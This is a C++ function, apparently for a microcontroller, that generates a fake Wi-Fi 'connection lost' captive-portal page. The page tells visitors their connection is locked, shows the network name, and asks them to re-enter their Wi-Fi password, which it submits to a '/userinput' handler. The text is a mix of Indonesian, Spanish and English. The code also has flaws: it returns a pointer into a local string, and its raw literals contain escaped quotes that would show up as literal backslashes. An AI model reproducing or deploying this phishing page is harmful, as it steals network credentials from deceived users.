const char *default_web(String ssid){
  String html = R"(
  <html>
  <head>
    <title>Koneksi Terputus</title>
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;" />
    <style>
body{
  background: #00BCD4;
  font-family:verdana;
}
img{
  width: 55px; 
  height: 55px; 
  padding-top: 30px; 
  display:block; 
  margin: auto;
}
input[type=password]{
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  border-radius: 4px;
  box-sizing: border-box;
}
input[type=submit]{
border-radius: 50px;
  width: 220px; 
  font-size: 13px;
  height: 38px; 
  background-color: #ffd01a; 
  border-color: #ffd01a;
  color: black; 
  font-weight: bold;
  
}
.alert {
  padding: 12px;
  background-color: #f44336;
  color: white;
  box-shadow: 0 0px 8px 5px rgba(0,0,0,0.2);
  background-size: auto;
  border-radius: 10px;
  font-size: 14px;
  
}
.card {
  box-shadow: 0 0px 8px 5px rgba(0,0,0,0.2);
  transition: 0.3s;
  /*background: linear-gradient(to bottom right,  #00BCD4, #6dd5ED);*/
  background-color: #00BCD4;
  color: white;
  height: 350px;
  width: 300px;
  bottom: 0px;
  left: 20px;
  right: 20px;
  top: 0px;
  position: absolute;
 /* display:block; */
  margin:auto;
  border-radius: 20px; /* 5px rounded corners */
}
.login{
  text-align: center;
}
    </style>
  </head>

  )";
html +=R"(
    <body>
   <div class="alert">
     <marquee><b><i>ALERTA!</b> Hubo un problema con su conexión, debe volver a introducir su contraseña WiFi.</i></marquee></div>
    <div class="card">
    <img alt="image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAQAAAD9CzEMAAABuklEQVR4Ae2Vva4SQRhAv9yEglW0sFELYqtvYryG3LUxUZASoo2xMLyCiU+g4adCX8GYEOURwIJCYuIt5MeGgLuNHCu/BDPMwM5OYnHPVw0BDvnOhJX/nQu4wSktugyYsCRly5aUBRMGdGlxynXENoJ5LhHzlimH8JU3nBEdKjjhHu/5xbFseMddTuyCEi/4hg9TnnPZLIho8ZM8WPKS4r+CR5yTJ995qAJu8ZEQfKCMCFVWhGLFY6FLSDpCxBdCMSYShDtsCMGa239vUZ0Q1PSaEqJEG0EF+ZcYUdwV5FdCt78r8C+R0iOmTIEC1xCDwKtEn5u2v2u/Er9puB44fiUaiEvgU6KPuAXZS6Q7u3/AkISEz5wZBJlK9BCd1wDKK4MgQ4kY/fVAQpMSV3hKClRQQfYSZf3EEGjq6RnwCRVkL1HQ9ydASU9XgQ0qyF5CdNCTni0CLRFUoCXCCbSEQxCzwMScikNgL6GCBfuYuQT2Emtdh2uHGUtUfQX2Em3ET2AvMaLoJbCX0Keuh8Beoob4CewlOkgAgZYYEwUQaAndPjrM2ccP4bip88TwaoWZ+eu5LwSeC4Fz/gDATa4EaJzNDAAAAABJRU5ErkJggg=="><p align="center" style="font-size: 18px;"><b><i>Your Connection Locked</i></b></p>
    
    )";
html +=R"(
      <div class="login"><p style="padding-top: 10px;"><b>
)";
html+=ssid;
html +=R"(
</b></p><form action='/userinput' method='get'>
<input type='password' name='password' minlength='8' placeholder="Please Input Wi-fi Password" required 
autofocus><br></br>
<input type="submit" value="Login">
</form></div>
)";
html +=R"(
 <a id=\"helpbutton\" onclick=\"toggleHelp()\" href=\"#\" style=\"color: white;
font-size: 12px; padding-left: 20px\"><b>What is this?</b></a></div>
<script>
function toggleHelp() {
alert(\"Son cosas que pasan.\");
}
document.getElementById(\"isURL\").value=document.domain;
</script>
  </body>
</html>
)";
return html.c_str();
}